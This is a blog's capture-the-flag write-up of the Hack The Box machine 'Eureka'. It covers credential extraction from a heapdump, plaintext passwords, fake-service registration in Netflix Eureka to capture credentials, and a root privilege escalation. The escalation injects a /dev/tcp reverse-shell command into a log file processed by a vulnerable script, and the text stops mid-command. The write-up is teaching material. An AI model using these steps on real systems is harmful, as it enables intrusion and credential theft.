<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>HTB-Eureka</title>
    <link href="/2025/09/13/HTB-Eureka/"/>
    <url>/2025/09/13/HTB-Eureka/</url>
    
    <content type="html"><![CDATA[<p><img src="/img/Eureka/machine.PNG"></p><h1 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h1><table><thead><tr><th>OS</th><th>Linux</th></tr></thead><tbody><tr><td>Difficulty</td><td>Hard</td></tr></tbody></table><h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap:"></a>Nmap:</h3><p><img src="/img/Eureka/nmap.png"></p><p>The <strong>Nmap scan</strong> reveals three open ports on <strong>paper.htb (10.10.11.143)</strong>:</p><ul><li><strong>Port 22 (SSH)</strong> </li><li><strong>Port 80 (HTTP)</strong></li></ul><p>Add :  furni.htb to  <strong>&#x2F;etc&#x2F;hosts</strong>:</p><p><img src="/img/Eureka/hosts.PNG"></p><p>The site on furni.htb is a furniture shop where I can register, log in, add items to a cart, and complete purchases, but nothing exploitable is immediately visible:</p><p><img src="/img/Eureka/furni.PNG"></p><h3 id="Directory-Subdomain-Enumeration"><a href="#Directory-Subdomain-Enumeration" class="headerlink" title="Directory &amp; Subdomain Enumeration:"></a>Directory &amp; Subdomain Enumeration:</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">dirsearch <span class="hljs-punctuation">-</span>u http<span class="hljs-punctuation">:</span><span class="hljs-comment">//furni.htb/</span><br></code></pre></td></tr></table></figure><p><img src="/img/Eureka/dirsearch.png"></p><p>Downloading this heapdump, and using Strings to search for any creds:</p><p><img src="/img/Eureka/heapdump.png"></p><p>{password&#x3D;0sc@r190_S0l!dP@sswd, user&#x3D;oscar190}</p><p>Those credentials are valid for <strong>SSH</strong> and I get a shell as <code>oscar190</code>.</p><h1 id="Initial-Access"><a href="#Initial-Access" class="headerlink" title="Initial Access"></a>Initial Access</h1><p><img src="/img/Eureka/ssh_oscar.PNG"></p><p>After running <strong>linpeas</strong>, we found some ports open:</p><p><img src="/img/Eureka/linpeas.png"></p><p>Forward port 8761:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> -L <span class="hljs-number">8761</span>:localhost:<span class="hljs-number">8761</span> oscar190@<span class="hljs-number">10.10.11.66</span><br></code></pre></td></tr></table></figure><p>Navigating to <code>localhost:8761</code> brought up a login page. The credentials we had tried earlier didn’t work, so I continued digging. Running the following command on the heap dump:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">strings heapdump <span class="hljs-string">| grep 8761 </span><br></code></pre></td></tr></table></figure><p>I found another set of credentials, which turned out to be valid for the login</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-number">344576</span><span class="hljs-symbol">:http</span><span class="hljs-symbol">://EurekaSrvr</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span>scarPWDisTheB3st<span class="hljs-variable">@localhost</span><span class="hljs-symbol">:</span><span class="hljs-number">8761</span>/eureka/!<br></code></pre></td></tr></table></figure><p><img src="/img/Eureka/eurika.PNG"></p><h3 id="Hacking-Netflix-Eureka"><a href="#Hacking-Netflix-Eureka" class="headerlink" title="Hacking Netflix Eureka"></a>Hacking Netflix Eureka</h3><p>During my research, I came across a helpful article: <a href="https://engineering.backbase.com/2023/05/16/hacking-netflix-eureka">https://engineering.backbase.com/2023/05/16/hacking-netflix-eureka</a> , It explained how Eureka exposes registered services through the <code>/apps</code> endpoint</p><p><img src="/img/Eureka/apps1.png"></p><p><img src="/img/Eureka/apps2.png"></p><p>Once we discovered the target was using Netflix Eureka for service discovery, we leveraged its weak authentication and registered our own <strong>fake service</strong> in the registry. The goal was to <strong>trick internal systems</strong> into interacting with our malicious service, exposing sensitive data like login credentials.</p><h4 id="Register-a-Fake-Service"><a href="#Register-a-Fake-Service" class="headerlink" title="Register a Fake Service"></a>Register a Fake Service</h4><p>Eureka acts like a phonebook for microservices—it keeps track of which services exist and how to reach them. Normally, services register themselves to Eureka so others can find and communicate with them.</p><p>We sent a POST request to Eureka registering a fake service called <code>USER-MANAGEMENT-SERVICE</code>, pointing it to our own machine (<code>10.10.14.20</code>) on port <code>8081</code>.</p><p>This made other internal services believe our system was a legitimate microservice inside their trusted environment.</p><figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs julia">curl -X POST http://EurekaSrvr:<span class="hljs-number">0</span>scarPWDisTheB3st<span class="hljs-meta">@localhost</span>:<span class="hljs-number">8761</span>/eureka/apps/USER-MANAGEMENT-SERVICE   -H &#x27;Content-<span class="hljs-built_in">Type</span>: application/json&#x27;   -d &#x27;&#123;    <br><span class="hljs-string">&quot;instance&quot;</span>: &#123;                                                                                                                                                                         <span class="hljs-string">&quot;instanceId&quot;</span>: <span class="hljs-string">&quot;USER-MANAGEMENT-SERVICE&quot;</span>,<br>      <span class="hljs-string">&quot;hostName&quot;</span>: <span class="hljs-string">&quot;10.10.14.20&quot;</span>,<br>      <span class="hljs-string">&quot;app&quot;</span>: <span class="hljs-string">&quot;USER-MANAGEMENT-SERVICE&quot;</span>,<br>      <span class="hljs-string">&quot;ipAddr&quot;</span>: <span class="hljs-string">&quot;10.10.14.20&quot;</span>,<br>      <span class="hljs-string">&quot;vipAddress&quot;</span>: <span class="hljs-string">&quot;USER-MANAGEMENT-SERVICE&quot;</span>,<br>      <span class="hljs-string">&quot;secureVipAddress&quot;</span>: <span class="hljs-string">&quot;USER-MANAGEMENT-SERVICE&quot;</span>,<br>      <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;UP&quot;</span>,<br>      <span class="hljs-string">&quot;port&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;$&quot;</span>: <span class="hljs-number">8081</span>,<br>        <span class="hljs-string">&quot;@enabled&quot;</span>: <span class="hljs-string">&quot;true&quot;</span><br>      &#125;,<br>      <span class="hljs-string">&quot;dataCenterInfo&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;@class&quot;</span>: <span class="hljs-string">&quot;com.netflix.appinfo.InstanceInfo<span class="hljs-variable">$DefaultDataCenterInfo</span>&quot;</span>,<br>        <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;MyOwn&quot;</span><br>      &#125;<br>    &#125;<br>  &#125;&#x27;<br><br></code></pre></td></tr></table></figure><p>We exploited Eureka’s weak authentication by registering a fake microservice that pointed to our own machine. Because other internal services trust Eureka’s registry, they tried to communicate with our fake service—sending requests that included sensitive login credentials. By running a listener on our machine, we captured these credentials when an internal service unknowingly sent them during authentication, allowing us to escalate access within the target environment.</p><p><img src="/img/Eureka/exploit.png"></p><p>This is how we captured Miranda Wise’s credentials</p><p><img src="/img/Eureka/miranda.PNG"></p><h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><p>After running linPEAS and further enumeration I found an unexpected <code>/opt</code> directory containing <code>heapdump/</code> and an executable <code>log_analyse.sh</code> (<code>-rwxrwxr-x 1 root root 4980 Mar 20 14:17</code>), which looked worth investigating:</p><p><img src="/img/Eureka/opt.PNG"></p><p>The <code>log_analyse.sh</code> script takes a log file and generates a report. It counts successful and failed logins per user, tracks HTTP status codes, and highlights errors in the logs, including failed Eureka service connections. The output is color-coded for readability and saved into <code>log_analysis.txt</code>. Its main purpose is to summarize authentication activity, request patterns, and errors from the logs:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-comment"># Colors</span><br>GREEN=<span class="hljs-string">&#x27;\033[0;32m&#x27;</span><br>RED=<span class="hljs-string">&#x27;\033[0;31m&#x27;</span><br>YELLOW=<span class="hljs-string">&#x27;\033[1;33m&#x27;</span><br>BLUE=<span class="hljs-string">&#x27;\033[0;34m&#x27;</span><br>CYAN=<span class="hljs-string">&#x27;\033[0;36m&#x27;</span><br>RESET=<span class="hljs-string">&#x27;\033[0m&#x27;</span><br><br>LOG_FILE=<span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span><br>OUTPUT_FILE=<span class="hljs-string">&quot;log_analysis.txt&quot;</span><br><br><span class="hljs-built_in">declare</span> -A successful_users  <span class="hljs-comment"># Associative array: username -&gt; count</span><br><span class="hljs-built_in">declare</span> -A failed_users      <span class="hljs-comment"># Associative array: username -&gt; count</span><br>STATUS_CODES=(<span class="hljs-string">&quot;200:0&quot;</span> <span class="hljs-string">&quot;201:0&quot;</span> <span class="hljs-string">&quot;302:0&quot;</span> <span class="hljs-string">&quot;400:0&quot;</span> <span class="hljs-string">&quot;401:0&quot;</span> <span class="hljs-string">&quot;403:0&quot;</span> <span class="hljs-string">&quot;404:0&quot;</span> <span class="hljs-string">&quot;500:0&quot;</span>) <span class="hljs-comment"># Indexed array: &quot;code:count&quot; pairs</span><br><br><span class="hljs-keyword">if</span> [ ! -f <span class="hljs-string">&quot;<span class="hljs-variable">$LOG_FILE</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;RED&#125;</span>Error: Log file <span class="hljs-variable">$LOG_FILE</span> not found.<span class="hljs-variable">$&#123;RESET&#125;</span>&quot;</span><br>    <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><br><br><span class="hljs-function"><span class="hljs-title">analyze_logins</span></span>() &#123;<br>    <span class="hljs-comment"># Process successful logins</span><br>    <span class="hljs-keyword">while</span> IFS= <span class="hljs-built_in">read</span> -r line; <span class="hljs-keyword">do</span><br>        username=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$line</span>&quot;</span> | awk -F<span class="hljs-string">&quot;&#x27;&quot;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>)<br>        <span class="hljs-keyword">if</span> [ -n <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;successful_users[$username]+_&#125;</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>            successful_users[<span class="hljs-variable">$username</span>]=$((successful_users[<span class="hljs-variable">$username</span>] + <span class="hljs-number">1</span>))<br>        <span class="hljs-keyword">else</span><br>            successful_users[<span class="hljs-variable">$username</span>]=1<br>        <span class="hljs-keyword">fi</span><br>    <span class="hljs-keyword">done</span> &lt; &lt;(grep <span class="hljs-string">&quot;LoginSuccessLogger&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$LOG_FILE</span>&quot;</span>)<br><br>    <span class="hljs-comment"># Process failed logins</span><br>    <span class="hljs-keyword">while</span> IFS= <span class="hljs-built_in">read</span> -r line; <span class="hljs-keyword">do</span><br>        username=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$line</span>&quot;</span> | awk -F<span class="hljs-string">&quot;&#x27;&quot;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>)<br>        <span class="hljs-keyword">if</span> [ -n <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;failed_users[$username]+_&#125;</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>            failed_users[<span class="hljs-variable">$username</span>]=$((failed_users[<span class="hljs-variable">$username</span>] + <span class="hljs-number">1</span>))<br>        <span class="hljs-keyword">else</span><br>            failed_users[<span class="hljs-variable">$username</span>]=1<br>        <span class="hljs-keyword">fi</span><br>    <span class="hljs-keyword">done</span> &lt; &lt;(grep <span class="hljs-string">&quot;LoginFailureLogger&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$LOG_FILE</span>&quot;</span>)<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-title">analyze_http_statuses</span></span>() &#123;<br>    <span class="hljs-comment"># Process HTTP status codes</span><br>    <span class="hljs-keyword">while</span> IFS= <span class="hljs-built_in">read</span> -r line; <span class="hljs-keyword">do</span><br>        code=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$line</span>&quot;</span> | grep -oP <span class="hljs-string">&#x27;Status: \K.*&#x27;</span>)<br>        found=0<br>        <span class="hljs-comment"># Check if code exists in STATUS_CODES array</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;!STATUS_CODES[@]&#125;</span>&quot;</span>; <span class="hljs-keyword">do</span><br>            existing_entry=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;STATUS_CODES[$i]&#125;</span>&quot;</span><br>            existing_code=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$existing_entry</span>&quot;</span> | <span class="hljs-built_in">cut</span> -d<span class="hljs-string">&#x27;:&#x27;</span> -f1)<br>            existing_count=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$existing_entry</span>&quot;</span> | <span class="hljs-built_in">cut</span> -d<span class="hljs-string">&#x27;:&#x27;</span> -f2)<br>            <span class="hljs-keyword">if</span> [[ <span class="hljs-string">&quot;<span class="hljs-variable">$existing_code</span>&quot;</span> -eq <span class="hljs-string">&quot;<span class="hljs-variable">$code</span>&quot;</span> ]]; <span class="hljs-keyword">then</span><br>                new_count=$((existing_count + <span class="hljs-number">1</span>))<br>                STATUS_CODES[<span class="hljs-variable">$i</span>]=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;existing_code&#125;</span>:<span class="hljs-variable">$&#123;new_count&#125;</span>&quot;</span><br>                <span class="hljs-built_in">break</span><br>            <span class="hljs-keyword">fi</span><br>        <span class="hljs-keyword">done</span><br>    <span class="hljs-keyword">done</span> &lt; &lt;(grep <span class="hljs-string">&quot;HTTP.*Status: &quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$LOG_FILE</span>&quot;</span>)<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-title">analyze_log_errors</span></span>()&#123;<br>     <span class="hljs-comment"># Log Level Counts (colored)</span><br>    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n<span class="hljs-variable">$&#123;YELLOW&#125;</span>[+] Log Level Counts:<span class="hljs-variable">$&#123;RESET&#125;</span>&quot;</span><br>    log_levels=$(grep -oP <span class="hljs-string">&#x27;(?&lt;=Z  )\w+&#x27;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$LOG_FILE</span>&quot;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c)<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$log_levels</span>&quot;</span> | awk -v blue=<span class="hljs-string">&quot;<span class="hljs-variable">$BLUE</span>&quot;</span> -v yellow=<span class="hljs-string">&quot;<span class="hljs-variable">$YELLOW</span>&quot;</span> -v red=<span class="hljs-string">&quot;<span class="hljs-variable">$RED</span>&quot;</span> -v reset=<span class="hljs-string">&quot;<span class="hljs-variable">$RESET</span>&quot;</span> <span class="hljs-string">&#x27;&#123;</span><br><span class="hljs-string">        if ($2 == &quot;INFO&quot;) color=blue;</span><br><span class="hljs-string">        else if ($2 == &quot;WARN&quot;) color=yellow;</span><br><span class="hljs-string">        else if ($2 == &quot;ERROR&quot;) color=red;</span><br><span class="hljs-string">        else color=reset;</span><br><span class="hljs-string">        printf &quot;%s%6s %s%s\n&quot;, color, $1, $2, reset</span><br><span class="hljs-string">    &#125;&#x27;</span><br><br>    <span class="hljs-comment"># ERROR Messages</span><br>    error_messages=$(grep <span class="hljs-string">&#x27; ERROR &#x27;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$LOG_FILE</span>&quot;</span> | awk -F<span class="hljs-string">&#x27; ERROR &#x27;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>)<br>    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n<span class="hljs-variable">$&#123;RED&#125;</span>[+] ERROR Messages:<span class="hljs-variable">$&#123;RESET&#125;</span>&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$error_messages</span>&quot;</span> | awk -v red=<span class="hljs-string">&quot;<span class="hljs-variable">$RED</span>&quot;</span> -v reset=<span class="hljs-string">&quot;<span class="hljs-variable">$RESET</span>&quot;</span> <span class="hljs-string">&#x27;&#123;print red $0 reset&#125;&#x27;</span><br><br>    <span class="hljs-comment"># Eureka Errors</span><br>    eureka_errors=$(grep <span class="hljs-string">&#x27;Connect to http://localhost:8761.*failed: Connection refused&#x27;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$LOG_FILE</span>&quot;</span>)<br>    eureka_count=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$eureka_errors</span>&quot;</span> | <span class="hljs-built_in">wc</span> -l)<br>    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n<span class="hljs-variable">$&#123;YELLOW&#125;</span>[+] Eureka Connection Failures:<span class="hljs-variable">$&#123;RESET&#125;</span>&quot;</span><br>    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;YELLOW&#125;</span>Count: $eureka_count<span class="hljs-variable">$&#123;RESET&#125;</span>&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$eureka_errors</span>&quot;</span> | <span class="hljs-built_in">tail</span> -n 2 | awk -v yellow=<span class="hljs-string">&quot;<span class="hljs-variable">$YELLOW</span>&quot;</span> -v reset=<span class="hljs-string">&quot;<span class="hljs-variable">$RESET</span>&quot;</span> <span class="hljs-string">&#x27;&#123;print yellow $0 reset&#125;&#x27;</span><br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-title">display_results</span></span>() &#123;<br>    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;BLUE&#125;</span>----- Log Analysis Report -----<span class="hljs-variable">$&#123;RESET&#125;</span>&quot;</span><br><br>    <span class="hljs-comment"># Successful logins</span><br>    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n<span class="hljs-variable">$&#123;GREEN&#125;</span>[+] Successful Login Counts:<span class="hljs-variable">$&#123;RESET&#125;</span>&quot;</span><br>    total_success=0<br>    <span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;!successful_users[@]&#125;</span>&quot;</span>; <span class="hljs-keyword">do</span><br>        count=<span class="hljs-variable">$&#123;successful_users[$user]&#125;</span><br>        <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GREEN&#125;</span>%6s %s<span class="hljs-variable">$&#123;RESET&#125;</span>\n&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$count</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$user</span>&quot;</span><br>        total_success=$((total_success + count))<br>    <span class="hljs-keyword">done</span><br>    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GREEN&#125;</span>\nTotal Successful Logins: $total_success<span class="hljs-variable">$&#123;RESET&#125;</span>&quot;</span><br><br>    <span class="hljs-comment"># Failed logins</span><br>    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n<span class="hljs-variable">$&#123;RED&#125;</span>[+] Failed Login Attempts:<span class="hljs-variable">$&#123;RESET&#125;</span>&quot;</span><br>    total_failed=0<br>    <span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;!failed_users[@]&#125;</span>&quot;</span>; <span class="hljs-keyword">do</span><br>        count=<span class="hljs-variable">$&#123;failed_users[$user]&#125;</span><br>        <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;RED&#125;</span>%6s %s<span class="hljs-variable">$&#123;RESET&#125;</span>\n&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$count</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$user</span>&quot;</span><br>        total_failed=$((total_failed + count))<br>    <span class="hljs-keyword">done</span><br>    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;RED&#125;</span>\nTotal Failed Login Attempts: $total_failed<span class="hljs-variable">$&#123;RESET&#125;</span>&quot;</span><br><br>    <span class="hljs-comment"># HTTP status codes</span><br>    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n<span class="hljs-variable">$&#123;CYAN&#125;</span>[+] HTTP Status Code Distribution:<span class="hljs-variable">$&#123;RESET&#125;</span>&quot;</span><br>    total_requests=0<br>    <span class="hljs-comment"># Sort codes numerically</span><br>    IFS=$<span class="hljs-string">&#x27;\n&#x27;</span> sorted=($(<span class="hljs-built_in">sort</span> -n -t<span class="hljs-string">&#x27;:&#x27;</span> -k1 &lt;&lt;&lt;<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;STATUS_CODES[*]&#125;</span>&quot;</span>))<br>    <span class="hljs-built_in">unset</span> IFS<br>    <span class="hljs-keyword">for</span> entry <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;sorted[@]&#125;</span>&quot;</span>; <span class="hljs-keyword">do</span><br>        code=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$entry</span>&quot;</span> | <span class="hljs-built_in">cut</span> -d<span class="hljs-string">&#x27;:&#x27;</span> -f1)<br>        count=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$entry</span>&quot;</span> | <span class="hljs-built_in">cut</span> -d<span class="hljs-string">&#x27;:&#x27;</span> -f2)<br>        total_requests=$((total_requests + count))<br>        <br>        <span class="hljs-comment"># Color coding</span><br>        <span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$code</span> =~ ^2 ]]; <span class="hljs-keyword">then</span> color=<span class="hljs-string">&quot;<span class="hljs-variable">$GREEN</span>&quot;</span><br>        <span class="hljs-keyword">elif</span> [[ <span class="hljs-variable">$code</span> =~ ^3 ]]; <span class="hljs-keyword">then</span> color=<span class="hljs-string">&quot;<span class="hljs-variable">$YELLOW</span>&quot;</span><br>        <span class="hljs-keyword">elif</span> [[ <span class="hljs-variable">$code</span> =~ ^4 || <span class="hljs-variable">$code</span> =~ ^5 ]]; <span class="hljs-keyword">then</span> color=<span class="hljs-string">&quot;<span class="hljs-variable">$RED</span>&quot;</span><br>        <span class="hljs-keyword">else</span> color=<span class="hljs-string">&quot;<span class="hljs-variable">$CYAN</span>&quot;</span><br>        <span class="hljs-keyword">fi</span><br>        <br>        <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;color&#125;</span>%6s %s<span class="hljs-variable">$&#123;RESET&#125;</span>\n&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$count</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$code</span>&quot;</span><br>    <span class="hljs-keyword">done</span><br>    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;CYAN&#125;</span>\nTotal HTTP Requests Tracked: $total_requests<span class="hljs-variable">$&#123;RESET&#125;</span>&quot;</span><br>&#125;<br><br><br><span class="hljs-comment"># Main execution</span><br>analyze_logins<br>analyze_http_statuses<br>display_results | <span class="hljs-built_in">tee</span> <span class="hljs-string">&quot;<span class="hljs-variable">$OUTPUT_FILE</span>&quot;</span><br>analyze_log_errors | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">&quot;<span class="hljs-variable">$OUTPUT_FILE</span>&quot;</span><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n<span class="hljs-variable">$&#123;GREEN&#125;</span>Analysis completed. Results saved to $OUTPUT_FILE<span class="hljs-variable">$&#123;RESET&#125;</span>&quot;</span><br></code></pre></td></tr></table></figure><p>Running pspy, we get the following output:</p><p><img src="/img/Eureka/pspy.PNG"></p><p>pspy showed <code>log_analyse.sh</code> being run as root on various application logs, indicating the script executes with high privileges and could be interesting for privilege escalation.</p><h3 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation:"></a>Exploitation:</h3><p>The <code>log_analyse.sh</code> script runs as <strong>root</strong> and processes log files without properly validating their contents. The user <code>miranda-wise</code> belongs to the <code>developers</code> group and has <strong>write permissions</strong> on the log directory, which allows deletion and recreation of log files, even though the script itself runs as root.</p><p>This means it is possible to inject specially crafted lines into the log files that match the pattern <code>HTTP Status: …</code>. When the script reads these lines, it interprets part of the content as a shell command and executes it with <strong>root privileges</strong>:</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs swift">miranda<span class="hljs-operator">-</span>wise<span class="hljs-meta">@eureka</span>:<span class="hljs-operator">~</span>$ rm <span class="hljs-operator">-</span>f <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/web/</span>user<span class="hljs-operator">-</span>management<span class="hljs-operator">-</span>service<span class="hljs-regexp">/log/</span>application.log<br><br>miranda<span class="hljs-operator">-</span>wise<span class="hljs-meta">@eureka</span>:<span class="hljs-operator">~</span>$ echo &#x27;<span class="hljs-type">HTTP</span> <span class="hljs-type">Status</span>: x a[$(bash <span class="hljs-operator">-</span>i <span class="hljs-operator">&gt;&amp;</span> <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/10.10.14.20/</span><span class="hljs-number">4444</span> <span class="hljs-number">0</span><span class="hljs-operator">&gt;&amp;</span><span class="hljs-number">1</span>)]&#x27; <span class="hljs-operator">&gt;</span> <span 